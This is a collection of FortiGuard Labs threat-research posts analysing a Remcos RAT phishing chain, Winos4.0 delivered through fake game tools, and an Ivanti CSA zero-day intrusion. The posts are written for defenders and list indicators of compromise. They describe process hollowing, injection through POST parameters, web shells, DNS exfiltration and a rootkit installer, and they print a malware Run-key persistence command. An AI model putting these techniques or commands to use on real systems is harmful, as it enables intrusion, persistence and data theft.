highlighted codes are simulated, which can invalidate any API breakpoints. Whenever any of the above detection conditions are triggered, the current process (PowerShell.exe) can become unresponsive, crash, or exit unexpectedly. The malicious code performs process hollowing to put itself into a newly created Vaccinerende.exe process (copied from dllhost.exe). To do this, it calls the API CreateProcessInternalW() with CreatFlags of CREATE_SUSPENDED (0x4), which will suspend the new process after it is created. It then calls some related APIs to transfer all the malicious code to the new process and run it. The relevant APIs are NtAllocateVirtualMemory(), ZwCreateSection(), NtMapViewOfSection(), NtGetContextThread(),  NtSetContextThread(), and NtResumeThread(). It performs all the anti-analysis detections described in the above section and then uses a workflow different from the PowerShell process. According to my research, it finishes some tasks, like maintaining persistence, downloading and decrypting the Remcos payload execution, and starting the downloaded Remcos in memory. The malicious code adds a new auto-run item to the system registry to maintain persistence and maintain control of the victim’s device when it is restarted. Figure 14 shows the malicious code as it is about to run the REG (reg.exe) process to add the auto-run item and how it appears in the Registry Editor. It calls the API ShellExecuteW() to run cmd.exe with a command line string of /c REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v \"Chivey57\" /t REG_EXPAND_SZ /d \"%Misbehavers% -windowstyle 1 $Frligheden=(gp -Path 'HKCU:\\Software\\Roscoelite\\').Aftvttedes;%Misbehavers% ($Frligheden).\" “%Misbehavers%” has been defined as the full path to the 32-bit PowerShell.exe in the system environment. It reads a piece of PowerShell code, which is the same as the PowerShell code that dllhost.exe executes, from a string value called “Aftvttedes” in the system registry. Next, the malicious code downloads an encrypted file from the URL “hxxp[:]//192[.]3[.]220[.]22/hFXELFSwRHRwqbE214.bin.”  The file contains the encrypted Remcos malware. To download the file, some relevant APIs, like InternetOpenA(), InternetOpenUrlA(), and InternetReadFile(), are called in a row. After decrypting the downloaded file, I found a new variant of Remcos. Rather than saving the Remcos file into a local file and running it, it directly deploys Remcos in the current process's memory (Vaccinerende.exe). In other words, it is a fileless variant of Remcos. It then starts Remcos on a thread, where the thread function (StartAddress) is the entry point. To start the thread, it calls an undocumented API, NtCreateThreadEx(). Figure 15 shows a screenshot of the debugger as it is about to call the API to start Remcos. Each Remcos variant has a setting block with a batch of configurations that control how Remcos operates on the victim’s device. The setting block is encrypted and saved in the Resource section named “SETTINGS,” which gets decrypted at the start and initializes Remcos with the setting block. Look at Figure 16 to examine the decrypted setting block in memory. The setting block has 57 values in total, which are separated by “\\x7C\\x1E\\x1E\\x1F\\x7C”, as illustrated in Figure 16. The values in the setting block are retrieved by their index, from 0 to 56, through a special function. The setting values tell Remcos how to do its work on the victim’s device, including the C&C server IP address and port, Remcos’ name, Remcos’ mutex name (also registry key name), a Remcos license number, the keylogger’s local log file, a couple of certificates used to verify and communicate with the C&C server, and several switch flags indicating if a feature is enabled or disabled, such as Keylogger, Screenshot, Watchdog, Record audios, Reset browsers’ login, and more. The C&C server IP&Port string at index 0 is “107[.]173[.]4[.]16:2404:1,” where “107[.]173[.]4[.]16” is the IP address, “2404” is the TCP port, and the last “1” means that it enables TLS to communicate with the C&C server. Remcos collects some basic information from the victim’s device. It then encrypts and sends the collected data to its C&C server to register that the victim’s device is online and ready to be controlled. This is the first command packet sent to the C&C server. The memory dump data in Figure 17 shows the content of the register packet (command ID 4Bh) that is about to be encrypted. When TLS is enabled (as set in the settings block), packets follow the same structure, whether sending or receiving. These packets consist ofPacket Magic(like 0xFF0424) +Command Data Size(like 0x2C6) +Command ID(like 0x4B) +Command Data+Packet Type(like 0x17, 0x16, and 0x15). I will break down the command data of the 4B to explain what basic information Remcos collects from the victim’s device. The command data has many separators (“\\x7C\\x1E\\x1E\\x1F\\x7C”) to separate the collected basic information. After registering the victim’s device on the C&C server, it receives a control command packet from the server to perform further work on the victim’s device. These features and corresponding commands are detailed below. This example of control command 06h asks Remcos to obtain all running process lists from the victim’s device. Remcos sends a 4Fh command packet with the collected process list consisting of the process name, PID, architecture (64bit or 32bit), and the full path, as shown in Figure 18. Figure 19 is a screenshot of the C&C server view of the process list. Remcos includes a function that parses the received control command data from the server and then performs the corresponding action on the victim’s device. My analysis of this function shows that Remcos has the features and commands listed in the following chart. In this analysis, I walked through the entire process of the phishing campaign. It begins with a phishing email with an attached OLE Excel document. This disguised email is used to trick the recipient into opening the attached Excel document. The CVE-2017-0199 vulnerability is exploited once the Excel file is opened on the victim’s device. It then downloads an HTA file and executes it on the device. Multiple script languages are leveraged to download an EXE file (dllhost.exe), which then starts the 32-bit PowerShell process to load the malicious code from extracted files and execute it in the PowerShell process. Next, I explained what anti-analysis techniques are used in the code, such as a vectored exception handler, dynamically gained APIs, dynamically calculated constant numbers, the APIs ZwSetInformationThread() and ZwQueryInformationProcess(), and API hooking. After passing the detections introduced in the anti-analysis part, it performs process hollowing to run the malicious code in the new process “Vaccinerende.exe,” which not only ensures persistence on the victim’s device but also downloads and decrypts the Remcos payload file. I then elaborated on how it keeps Remcos in memory and starts its entry point function in a thread (API NtCreateThreadEx()). Subsequently, I explained how Remcos works with its setting block on the victim’s device, how Remcos communicates with its C&C server, and what the format of the traffic packet looks like. Finally, I focused on introducing the features this Remcos variant can perform on the victim’s device and listing the relevant control commands for each feature. Figure 20 shows the entire process of the phishing campaign. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The relevant URLs are rated as “Malicious Websites” by theFortiGuard Web Filtering service. FortiMailrecognizes the phishing email as “virus detected.” In addition, real-time anti-phishing provided by FortiSandbox embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions offers advanced protection against both known and unknown phishing attempts. FortiGuard IPS servicedetects the vulnerability exploit against CVE-2017-0199 with the signature “MS.Office.OLE.autolink.Code.Execution”. FortiGuard Antivirus servicedetects the original Excel document, the HTA file, the downloaded executable file, the data/script files and the Recom executable file with the following AV signatures. MSExcel/CVE-2017-0199.REM!exploitJS/Remcos.CB!tr.dldrPowerShell/Remcos.SER!trData/Remcos.LAV!trW32/Remcos.LD!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. The FortiGuard CDR (content disarm and reconstruction) service can disarm the embedded link object inside the Excel document. To stay informed of new and emerging threats, you cansign upto receive future alerts. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxps://og1[.]in/2Rxzb3hxxp://192[.]3[.]220[.]22/xampp/en/cookienetbookinetcahce.htahxxp://192[.]3[.]220[.]22/hFXELFSwRHRwqbE214.binhxxp://192[.]3[.]220[.]22/430/dllhost.exe 107[.]173[.]4[.]16:2404 [PO-9987689987.xls]4A670E3D4B8481CED88C74458FEC448A0FE40064AB2B1B00A289AB504015E944 [cookienetbookinetcahce.hta]F99757C98007DA241258AE12EC0FD5083F0475A993CA6309811263AAD17D4661 [dllhost.exe / Vaccinerende.exe]9124D7696D2B94E7959933C3F7A8F68E61A5CE29CD5934A4D0379C2193B126BE [Aerognosy.Res]D4D98FDBE306D61986BED62340744554E0A288C5A804ED5C924F66885CBF3514 [Valvulate.Cru]F9B744D0223EFE3C01C94D526881A95523C2F5E457F03774DD1D661944E60852 [Remcos / Decrypted hFXELFSwRHRwqbE214.bin]24A4EBF1DE71F332F38DE69BAF2DA3019A87D45129411AD4F7D3EA48F506119D rat FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/new-campaign-uses-remcos-rat-to-exploit-victims"
  },
  {
    "title": "Threat Campaign Spreads Winos4.0 Through Game Application",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Compromised machines are under the control of the threat actorSeverity Level:Medium Winos4.0 is an advanced malicious framework that offers comprehensive functionality, a stable architecture, and efficient control over numerous online endpoints to execute further actions. Rebuilt from Gh0strat, it includes several modular components, each handling distinct functions. Winos4.0 has been deployed in various attack campaigns, such as Silver Fox. FortiGuard Labs has identified multiple samples of this malware hidden within gaming-related applications, including installation tools, speed boosters, and optimization utilities. Analysis of the decoded DLL file reveals a potential targeting of the education sector, as indicated by its file description, “校园政务” (Campus Administration). In this blog post, we will delve into a comprehensive technical analysis of a campaign that leveraged these applications to deliver Winos4.0. Initial access is achieved by distributing game-related applications designed for optimization or installation. After the victim runs the application, it retrieves a fake BMP file from the server ad59t82g[.]com. The file is then XOR decoded, extracting the DLL “you.dll,” which is loaded through its export function “you” to proceed to the next stage. This DLL file is responsible for setting up the execution environment. It begins by downloading three files from the same remote path “hxxp://ad59t82g[.]com/1/” used in the previous stage. A folder with a random name is then created in “C:\\Program Files (x86),” where” text.bmp” is saved as “t3d.tmp,” “d.bmp” as “t4d.tmp,” and “t2.bmp” as “t5d.tmp.” It then extracts “t3d.tmp” using the password “lalala123%,” obtaining three clean files: u72kOdQ.exe, MSVCP140.dll, and VCRUNTIME140.dll. Next, it decodes “t4d.tmp” with XOR key 0x67080000 to reveal the main malicious file, “libcef.dll.” The purpose of the three extracted files is to load “libcef.dll” to inject shellcode. The DLL is named “学籍系统,” meaning “Student Registration System,” suggesting that the threat actor may be targeting educational organizations. Next, It checks for the presence of a window with the specific class name “Q360SafeMonClass.” If the window is not found, it proceeds to establish persistence by adding the executable “u72kOdQ.exe” to the registry key “SOFTWARE\\\\MICROSOFT\\\\WINDOWS\\\\CURRENTVERSION\\\\RUN” under the name “WINDOWS.” It then loads the “Shell32” library and calls “ShellExecuteA” to execute u72kOdQ.exe. If the window “Q360SafeMonClass” is present, it transfers to setting a scheduled task. It downloads another encoded file, “hxxp://ad59t82g[.]com/1/h[.]bmp.” The XOR-decoded result is an MSIL file embedded with a Base64-encoded command. The decoded command intends to create a scheduled task named “Window Defender Uqdata” that executes a specified command (execute “u72kOdQ.exe”) starting one minute from the current time, with a repetition interval of one minute and configured to restart up to three times if necessary. The task runs with the highest privileges (RunLevel 1). Following the persistence setup, the malicious DLL “libcef.dll” decodes “t5d.tmp” using an XOR key 0x67080000. Once decoded, it injects the extracted shellcode, preparing it to execute actions within the compromised environment. The shellcode dynamically loads APIs, as shown in Figure 13. The shellcode retrieves configuration data by searching for the marker string “codecode,” a change from the previous version, which used the string “codemark” for this purpose. The malware retrieves the C2 address 202[.]79[.]173[.]4 and port 80, establishing a connection using the TCP protocol (t1:1). It sends “x32” to the C2 for module downloading, which serves to check in the victim. The downloaded module consists of encrypted data with a size of 0x4B00E. The data is decrypted using a simple XOR operation with the key value of 0x2B. The decrypted 32-bit module is “上线模块.dll.” It is then executed, leading to the next stage. The modules described in the following sections are all components of Winos4.0. They facilitate online functionality, including logging in and checking in with the server. Additionally, they enable the retrieval of C2 commands and downloading modules. The entry first calls a function to check whether the value of the registry key “HKEY_CURRENT_USER\\\\Console\\\\IpDate” is valid. This value will later be used to update the main server address in the subsequent payload downloaded via C2. Once it confirms that it can reach the C2 server, it then downloads encoded data from its C2. It saves the XOR-decoded results in the registry “HKEY_CURRENT_USER \\\\Console\\\\0\\\\ d33f351a4aeea5e608853d1a56661059.” Once the module is configured for the next stage, the C2 server address information is recorded in the registry key “HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\IpDates_info.” This module is responsible for information collection, environment checks, and core backdoor functionality. Its functions include: During this campaign's attack, we retrieved two plugins from the command and control (C2) server, which are stored in the registry under the key “HKEY_CURRENT_USER\\\\Console\\\\0.” These modules are specifically designed to capture screenshots and manage documents. Upon receiving directives from the C2 server, these plugins facilitate uploading documents from the compromised system, enabling the attacker to gather sensitive information and discreetly monitor activities. Winos4.0 is a powerful framework, similar to Cobalt Strike and Sliver, that can support multiple functions and easily control compromised systems. Threat campaigns leverage Game-related applications to lure a victim to download and execute the malware without caution and successfully deploy deep control of the system. The entire attack chain involves multiple encrypted data and lots of C2 communication to complete the injection. Users should be aware of any new application's source and only download the software from qualified sources. The malware described in this report is detected and blocked byFortiGuard Antivirusas: W32/Agent.HUJ!tr.dldrW32/Agent.NJD!trData/Agent.3A23!trW32/Agent.501F!trMSIL/Agent.93AB!trW32/Agent.DCO!trW32/Agent.SS!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard Web Filtering Serviceblocks the C2 servers and downloads URLs. We also suggest that organizations go through Fortinet’s free training module:Fortinet Certified Fundamentals (FCF) in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp://ad59t82g[.]com/1/lon2[.]bmphxxp://ad59t82g[.]com/1/text[.]bmphxxp://ad59t82g[.]com/1/d[.]bmphxxp://ad59t82g[.]com/1/t2[.]bmphxxp://ad59t82g[.]com/1/h[.]bmp ad59t82g[.]com202[.]79[.]173[.]4 c9817d415d34ea3ae07094dae818ffe8e3fb1d5bcb13eb0e65fd361b7859eda7 NetDiagnotor.exe (天谕客户端检测工具)284cf31ebb4e7dc827374934ad0726f72e7aaef49cadc6aa59d2a2ff672d3fe8 gpatchex.exe (梦幻西游更新程序)b2a3aaf4eb4deb85462e1ee39c84caf2830091c1bff8014ad13147897b25e24c Duoyi (战盟安装程序)b763d77b7aaa83d6c4a9e749cd3c7638127e755d3dc843b15b6c4afce1f468b5 劲舞团联合登录器.exe (窗口化)dcdbc3b246233befa25b67909a01b835f1875f4047875ef13f1b801cd2da6fcd Duoyi (战盟安装程序)3fae0495fd0acc7722c2482c0ef3c6ab9ee41acbcaac46a8933c7b36b8896378 crashreporter.exef41236ab5ceffc5379fcf444de358cbc6f67beb31d0e0fd3f7ed0f501eb740ff yxqxunyou.exe (英雄联盟优化)80b1d6411e29e51e54f20f46856d31b28e087e9244693e65d022b680c4ba00ce 劲舞团联合登录器.exe (窗口化)1a48347f5fc7c63cc03f30810f961133bd3912caf16ac403e11bc3491117181d manualupdate.exe (天谕手动更新工具)8748bb7512f16f8122779171686abe0fa0060f1126298290e240457dc90d0aa7 MatRepair.exe (反恐行动客户端修复程序)1354796b44239eef177431584848029161c232401a9580481dbfb5196465250e you.dllbef32532923903b12f04b54dd06ec81661f706c3b1397bc77c45492db3919248 you.dll033965f3063bc2a45e5bd3a57ffce098b9308668d70b9b3063f066df5f3e55dd you.dll922512203c7b9fa67e8db2f588ff4945f63e20c4bc0aafccdba749a442808ace you.dll04edb6585118d09205ee693a54249ed68ebbf68b3fc3d711d2aa0c815b7b3a23 shellcode51c7f320b95a64bcff050da86c7884bb4f89a5d00073d747f0da7345c8a4501f 学籍系统.dllff0c28c81cd0afd78f78c79863c9f4c8afd9d3877a213dfc2dbb55360b7d93ab ConsoleApp2.exea27dc6e5aea0c3168117cfde2adb01f73f20881fc6485b768915216c46115064 差异屏幕.vll8f0079a41a262536f502b4b57473effd6ab7955bc2d6e99e0910df18e990a9f6 文件管理.vll37104f3b3646f5ffc8c78778ec5fdc924ebb5e5756cb162c0e409d24bedf406d 上线模块.dll (online module)a30b68ed39c1517d10b747c2fcd7a72cb12dc8f434203243e7c50df0e56d17d0 登录模块.dll (login module) Cara Lin FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/threat-campaign-spreads-winos4-through-game-application"
  },
  {
    "title": "Burning Zero Days: Suspected Nation-State Adversary Targets Ivanti CSA",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Ivanti Cloud Services Appliance version 4.6 and priorImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:Critical Today FortiGuard Labs is releasing this blog post about a case where an advanced adversary was observed exploiting three vulnerabilities affecting the Ivanti Cloud Services Appliance (CSA). At the time of our investigation, two out of the three identified vulnerabilities were not publicly known. This incident is a prime example of how threat actors chain zero-day vulnerabilities to gain initial access to a victim’s network. In a recent incident response engagement, FortiGuard Incident Response (FGIR) services were engaged by a customer to investigate malicious communication originating from their network. During the investigation, FGIR came across an adversary who had gained access to the customer’s network by exploiting the CVE-2024-8190 and two previously unknown vulnerabilities affecting the PHP front end of the Ivanti CSA appliance. The incident was detected by the customer on September 9, 2024, when some of its internal systems were found to be communicating to a malicious IP address,206[.]189[.]156[.]69. FGIR was engaged the next day. During the IR investigation, FGIR observed that the threat actor exploited the vulnerability CVE-2024-8190 in conjunction with the following two previously publicly unknown vulnerabilities: These resources are located under the root folder of the PHP web front, which serves as the management console of the CSA. On September 19, 2024, FGIR disclosed to Ivanti’s security team the discovery of the two new vulnerabilities. During the meeting, the Ivanti team claimed that they were aware and tracking the two publicly unknown exploited vulnerabilities. On September 19, Ivanti published the advisory for CVE-2024-8963, which addressed the path traversal vulnerability. On September 10, 2024, at 14:00:02, Ivanti published the security advisoryCVE-2024-8190on their forum. The advisory informed about the discovery of an authenticated command injection vulnerability in theDateTimeTab.phpresource, affecting CSA 4.6 with patch 518 and earlier versions. On September 13, 2024, the CVE-2024-8190 vulnerability was added to the CISA’s Known Exploited Vulnerabilities list. On the same date, Ivanti updated their security advisory to mention that, following public disclosure of the September 10th, exploitation of the command injection vulnerability had been observed in the wild. On September 16, 2024, the research team at Horizon3.ai publishedthe detailsrelated to the CVE-2024-8190 vulnerability and also released a proof of concept exploit code. During the incident response investigation, FGIR observed that the threat actor exploited a path traversal vulnerability on the resource/client/index.phpto gain unauthorized authenticated access to the resource/gsb/users.phpby sending the following web request: The first of such requests was sent by the threat actor on September 4, 2024, at 06:53:14 UTC, right before the exploitation of the command injection vulnerability, affecting the resource/gsb/reports.php. The resource/client/index.phpon the PHP web front of the Ivanti CSA appliance can be accessed by unauthenticated users to download the “LANDESK Remote Assistance Client” software package. The following picture shows how the resource/client/index.phplooks when opened in a browser: Upon inspecting the /client/index.php’s code, FGIR discovered that, by clicking the “Install now” button present on it, the user is redirected to a resource called /client/download.php: The resource/client/download.phpredirects the user to the pageOnDemand.phpvia the header function. The resource/client/OnDemand.phpcontains the code to open a local file calledLDSupport.exe, using the php functionpopen. The local fileis served to the user via the phpechocommand. The threat actor sent a malformed URL to the resource/client/index.php,by inserting%3F.phpat the end of the URI, and appended the URL with the location of the php resource to be accessed through path traversal. Using this technique, the threat actor managed to access the resource/gsb/users.php. The appended resource,/gsb/users.php, was assigned to the variable$filenamein the/client/OnDemand.phpcode, which led to the path traversal vulnerability, allowing the threat actor to view the list of users configured in the CSA appliance. FGIR simulated the exploitation of this vulnerability in its lab environment to understand what information could be acquired with it and the figure below shows the resulting output, which includes the list of users configured on the test appliance: The threat actor exploited this vulnerability several times over the course of their intrusion to access other resources as well, with connections originating from various IP addresses. As seen in the screenshot below, which has all times expressed using the timezone UTC-007, the threat actor used the same vulnerability to access the resource/gsb/datetime.phpas well. FGIR states with medium confidence that the threat actor exploited this path traversal vulnerability to gain access to the resource/gsb/users.phpnot only to list users, but also to attempt to create rogue users and gain authenticated access to the CSA web front end. Themessageslogs contain evidence of the threat actor creating two users:aiadminandservices, using the CSA utility calleddbtool. This was likely performed to maintain persistent, authenticated access to the CSA management console. After the threat actor exploited the path traversal vulnerability and enumerated users configured on the CSA appliance, they exploited CVE-2024-8190, the command injection vulnerability affecting the resource /gsb/DateTimeTab.php, to attempt to access the credentials of those users. FGIR observed evidence of this exploitation in Ivanti’s broker logs, as seen in the snippet below. FGIR has high confidence that the threat actor exploited this vulnerability to gain access to the user,admin’s credentials and use these privileged credentials to carry out the authenticated exploitation of the command injection vulnerability in/clients/reports.phpresource. FGIR found the text “rewritten with new timezone” within the functionsetPhpTimeZone($timezoneinfo)of the resourceDateTimeTab.php. From the above systemLog function call, it is clear that the value of the variable, $timezone was the one that was manipulated by the threat actor. Tracing back the value of this variable shows that it was deduced from the parameter$timezoneinfo, which was passed to the functionsetPhpTimeZone. Tracing back where thesetPhpTimeZonewas called, FGIR found that this happened within the functionhandleDateTimeSubmit(&$msg). This function is responsible for handling change submissions when the “Save” button is clicked, as depicted in the screenshot below. The value of a global variable, $TIMEZONE, which was passed as a variable to the functionsetPhpTimeZone, was received from the POST request variableTIMEZONE. This implies that the threat actor crafted and sent a malicious POST request toDateTimeTab.php, with the malicious command passed in the POST request variableTIMEZONE. Going back to the malicious command injected by the threat actor, FGIR decoded the base64 blob, which resulted in the following Python code: The script extracts the password of the usergsbadminfrom the file/opt/landesk/broker/broker.confand assigns its value to the environment variablePGPASSWORD. The code targets the latest backup file in the/backupsdirectory and iterates through this directory to find the latest backup file. If it finds one, then it connects to the Postgres database using thegsbadmincredentials, extracts the password of the useradminfrom the tableuser_info,and assigns it to the environment variablePGPASSWORD. The script then decompresses the latest backup file, and then iterates through the files to search for a filename that satisfies the regular expressionphp\\w{6}, basically looking for a filename containing the stringphpfollowed by six characters (letters or numbers only). In case it finds such a file, it changes the permissions of the file so thateveryonehas the right to read, write, and execute it. The script then reads the private key from the backup file of the userroot, encodes it using base64, and then assigns the resultant value to the columnorganizationin the Postgres database table,user_info. While assessing the backend Postgres database logs, FGIR found confirmation of successful exploitation of this command injection vulnerability, as seen in the screenshot below: Once the threat actor extracted the credentials of the usersgsbadmin, admin, and the private key of the userroot,they used the stolen credentials to perform authenticated exploitation of the publicly unknown command injection vulnerability affecting the resource/gsb/reports.php. Some of the threat actor requests can be seen in the messages and audit logs below: Command injection was found to be exploited in the following format, where a php script/subin/tripwirewas executed with the parameter–update,followed by a semicolon and a malicious command. The first malicious command injected by the threat actor was used to create a web shell calledhelp.phpin the CSA webroot folder under the/gsbdirectory. FGIR looked at the code of the resourcereports.phpand identified the vulnerability in the line highlighted below in yellow. The script accepts the value of the POST parameterTW_IDand passes it as a parameter to the script/subin/tripwire, without sanitization. The resource/sbin/tripwireis a PHP wrapper for the binary/usr/sbin/tripwire, which is used to create security reports, when initiated through the gsb/reports.phpresource. This is a legitimate functionality of the Ivanti CSA portal. FGIR inspected the tripwire PHP wrapper script and found the functionupdatewhich passes the command directly to the installed tripwire binary without sanitization. Since the tripwire PHP wrapper runs withsudoprivileges, the injected command also runs with elevated privileges. FGIR acquired the patch for CVE-2024-8190, and while analyzing the functionality of the patch, FGIR assessed that the file,reports.phpwas not in the patch script, nor was it listed as a file in the patch folder, leading FGIR to conclude that the command injection vulnerability found in the resource/gsb/reports.phpwas not addressed in that patch. On September 10, 2024, when the advisory for CVE-2024-8190 was published by Ivanti, the threat actor, still active in the customer’s network, “patched” the command injection vulnerabilities in the resources/gsb/DateTimeTab.php, and/gsb/reports.php, making them unexploitable. In the past, threat actors have been observed to patch vulnerabilities after having exploited them, and gained foothold into the victim’s network, to stop any other intruder from gaining access to the vulnerable asset(s), and potentially interfering with their attack operations. In this case, the threat actor downloaded the patched version of the two vulnerable resources fromtemp[.]shand saved them as/tmp/1on disk, before moving them to the webroot folder and overwriting the vulnerable version of the files with them. Below are the relevant commands: The modified timestamps of the resourcesreports.php, andDateTimeTab.phpwere September 10, 2024, at 12:37:23 UTC and 13:06:10 UTC, respectively, as seen in the screenshots below. Comparing the original vulnerable version ofreports.phpto the version patched by the threat actor, shows that the threat actor added a piece of code to replace the semicolon with an underscore in the POST parameterTW_ID, so that command injection using the semicolon is not possible anymore. FGIR tested the patching in a lab environment and confirmed that the modification by the threat actor does indeed make the resourcereports.phpunexploitable after the patch. The screenshot below shows the directorytestwithoutfixwas successfully created by exploiting the command injection vulnerability on the original vulnerable version ofreports.php. When the fix is applied to thereports.phpfile and the command injection is exploited again, the directorytestwithfixis not created. The threat actor also patched the fileDateTimeTab.phpusing the samestr_replacefunction to replace any semicolon in the POST parameterTIMEZONE, with an underscore, rendering the command injection vulnerability using this parameter ineffective. After compromising the internet-facing Ivanti CSA appliance, the threat actor exploited the CVE-2024-29824 SQL Injection vulnerability on Ivanti’s backend SQL database server (SQLS). Sample malicious POST requests exploiting this vulnerability are depicted below. The threat actor enabled thexp_cmdshellstored procedure via the exploitation and used this stored procedure to attain remote code execution on the SQLS system. The threat actor created an account calledmssqlsvcon the compromised system SQLS and turned off the host firewall. FGIR also observed that the threat actor ran some basic reconnaissance commands on theSQLSsystem and attempted to exfiltrate the reconnaissance output using the following PowerShell command: This is a technique used to exfiltrate data over the DNS protocol. The technique is also known asDNS tunneling. See below for the content of the file that the threat actor tried to exfiltrate: FGIR discovered more tactics and techniques used by the threat actor during their intrusion. FGIR extracted and decoded some interesting commands executed by the threat actor from the Linux audit logs and other sources. A sample of those commands are shown in the table below: During the course of their operations, the threat actor created several webshells. They also modified the legitimate resource,syslog.php,and appended malicious code to it, to use it as a web shell. Some of the web shells found are shown in the table below. On September 11, at 04:12:00 UTC, the threat actor started an authentication brute force attack against the customer’s internal network assets, using a dictionary attack. FGIR discovered that the threat actor downloaded a tar file calledufrom atemp[.]shURL. This tar file contained three files:brokes, passdic.txt, andu.txt. The filebrokesis a Linux ELF binary, which was used to perform the brute force attack on customer’s network assets. It is likely thatbrokesused as parameters the list of customer’s users, possibly harvested during a different campaign, in the form of the fileu.txtand the password filepassdic.txt. The threat actor downloaded an unknown file calledtargetfromtemp[.]sh, however this one was not found on the disk. The threat actor also downloaded a shell script calleds.sh, from thetemp[.]shsite. This script was used to execute thebruteforcebinarybrokesand anonymous logins were attempted on LDAP’s port TCP 389 of the attacked assets with several passwords. During the memory analysis of the CSA appliance, FGIR discovered traces of the use of an open-source go-based proxy tool calledReverseSocks5, which was downloaded and used by the threat actor to perform scanning and brute force attacks on the customer’s internal network, while proxying the traffic through the CSA appliance. The string, which was created in the memory due to an error thrown by the tool, can be seen in the below snippet. Some other suspicious strings found during the analysis of the memory included some PHP variables found to be populated with suspicious values: ZjmgmXsB.phpwas a webshell, which the threat actor was interacting with, while accessing it from the IP address208[.]105[.]190[.]170. During the investigation, FGIR discovered that on September 7, 2024, at 03:26:17 UTC, the threat actor attempted to deploy a rootkit in the form of a Linux kernel object (KO) module on the CSA appliance. This attempt was found in the audit logs as seen in the snippet below: The likely motive behind this was for the threat actor to maintain kernel-level persistence on the CSA device, which may survive even a factory reset. This activity is in line with the public reporting on the compromise of Ivanti CSA appliances, which is availablehereandhere. FGIR decoded the hex string contained in the snippet above and obtained a base64 encoded blob. The initial part of the resultant base64 encoded blob indicates that this is a compressed archive file. Decompressing the tar file results in the following two files. The fileinstall.shis a malicious bash script that installs a malicious kernel object calledsysinitd.ko. The compressed archive file was corrupted and only the fileinstall.shcould be retrieved successfully in its entirety, while the filesysinitdwas truncated, and the filesysinitd.kowas missing. FGIR pivoted to the disk image of the CSA appliance and found thesysinitdandsysinitd.kofiles in the location/usr/share/empty/init/. The scriptinstall.shwas meant to install the malicious rootkitsysinitd.koon the affected system. The following variables were hard-coded in the scriptinstall.sh: The script starts with the following function call, which reads two parameters: The first parameter is the INSTALL_NAME string, which is used to rename the two files sysinitd andsysinitd.koto INSTALL_NAME and INSTALL_NAME.ko respectively. The second parameter is the path where the script copies the renamed version ofsysinitdandsysinitd.koto. In this case, the threat actor did not supply either of the two parameters. Therefore, the default namessysinitdandsysinitd.kowere used by the script. The following snippet of code checks if the install path exists and if not, then it creates it: The script then removes any installed kernel object with the name INSTALL_NAME.ko, using the commandrmmod, and then installs the malicious INSTALL_NAME.ko using the commandinsmod. The bash scriptinstall.shinstalls a persistence mechanism using the technique of adding an entry to install the malicious kernel object in therc.localandrc.d/rc.localfiles, if the malicious kernel object file is present on disk. FGIR aims to analyze the rootkit in detail and publish the findings in a follow-up blog post. The advanced adversaries were observed exploiting and chaining zero-day vulnerabilities to establish beachhead access in the victim’s network. You can read more about the Ivanti CSA zero-day attack in our Threat Signal Report:https://www.fortiguard.com/threat-signal-report/5556. The malware described in this report is detected and blocked byFortiGuard Antivirusas: BASH/Agent.030E!trELF/Agent.69A0!trELF/Agent.7E02!trELF/Agent.BD!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus service. The FortiGuard antivirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Fortinet has also released the following IPS signatures to protect our customers from the threats contained in the report. CVE-2024-8190;https://www.fortiguard.com/encyclopedia/ips/56651 The interactsh related URLs are rated as “Malicious Websites” and “Malicious Activities Found” by the FortiGuard Web Filtering service. FortiGuard IP Reputation and Anti-Botnet Security Service proactively blocks these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team. The MITRE ATT&CK framework has been used to refer to the various tactics and techniques used by the threat actor. Network Indicator Protocol Port Notes apiv5[.]serverbks[.]xyz 443 Domain associated with IP 156[.]234[.]193[.]18 74[.]62[.]81[.]162 57532 Threat actor’s C2 189f31ed7d[.]ipv6[.]bypass[.]eu[.]org Seen in encoded PowerShell used by the threat actor iowxuintgredogzgblrsmr2cx2e471bor.oast[.]fun Seen in encoded PowerShell used by the threat actor o.lencr[.]org Let's Encrypt domain name c67f045c2f.ipv6.1433.eu[.]org Seen in encoded PowerShell used by the threat actor 206[.]189[.]156[.]69 oast[.]fun domain IP 51[.]91[.]79[.]17 temp[.]sh domain IP 156[.]234[.]193[.]18 C2 IP found in the python reverse shell 208[.]105[.]190[.]170 Threat actor IP interacting with webshell http://temp[.]sh/khkzg/DateTimeTab.php HTTP 80 